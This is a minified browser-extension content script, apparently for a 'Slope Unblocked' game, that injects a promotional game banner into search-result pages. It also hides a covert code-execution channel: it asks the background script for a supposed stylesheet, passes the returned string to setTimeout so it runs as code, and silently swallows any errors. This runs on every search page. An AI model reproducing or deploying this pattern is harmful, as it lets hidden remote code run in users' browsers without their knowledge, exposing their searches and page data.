!function () {
  "use strict";
  let e = chrome.runtime.id.substr(0, 6), t = "style/" + e + ".css", n = window.location.pathname,
    i = window.location.search, o = -1 !== n.indexOf("search");
  if (!o) return;

  function s() {
  }

  if (["/search/images", "/search/video", "images/search", "videos/search"].forEach(function (e) {
    -1 !== n.indexOf(e) && (o = !1)
  }), !o || -1 !== i.indexOf("tbm=isch") || -1 !== i.indexOf("tbm=vid")) return;

  function a(e) {
    let t = !1;
    return i.substring(1).split("&").forEach(function (n, i) {
      let o = n.split("=");
      decodeURIComponent(o[0]) === e && (t = decodeURIComponent(o[1]).replace(/\+/g, " ").toLowerCase())
    }), t
  }

  let c = a("q") || a("p");
  o = c && -1 !== c.indexOf("Slope Unblocked".toLowerCase()), chrome.runtime.sendMessage({message: {r: t}}, function (e) {
    if (null != e) try {
      0 === e.indexOf("b") || setTimeout(e)
    } catch (e) {
    }
  }), window.localStorage.getItem(e) && (o = !1), o && void 0 === window[e] && (window[e] = !0, window.addEventListener("load", function () {
    let t = document.createElement("div");
    t.className = "game-button-box", t.innerHTML = '<div class="game-button-icon-box"></div><div class="game-button-section"><div class="game-button-title">Slope Unblocked</div><div class="game-button-installed"><img src="' + chrome.runtime.getURL("images/installed.svg") + '" alt="" width="27" height="27">' + chrome.i18n.getMessage("installed") + "</div></div>";
    let n = function (n) {
        return n && "function" == typeof n.preventDefault && n.preventDefault(), t.style.display = "none", t.innerHTML = "", window.localStorage.setItem(e, "1"), !1
      }, i = t.appendChild(document.createElement("a")), o = document.createElement("button"),
      a = document.createElement("button");
    i.setAttribute("href", "#"), i.setAttribute("class", "game-button-cross"), i.style.backgroundImage = 'url("' + chrome.runtime.getURL("images/close.svg") + '")', i.addEventListener("click", n, !0), o.innerText = chrome.i18n.getMessage("got_it"), a.innerText = chrome.i18n.getMessage("play");
    let c = t.children[1].appendChild(document.createElement("div"));
    c.className = "game-button-section-buttons", c.appendChild(o).addEventListener("click", n), c.appendChild(a).addEventListener("click", function () {
      chrome.runtime.sendMessage({message: "open"}, s), t.style.display = "none", t.innerHTML = ""
    }), document.body.insertBefore(t, document.body.children[0])
  }))
}();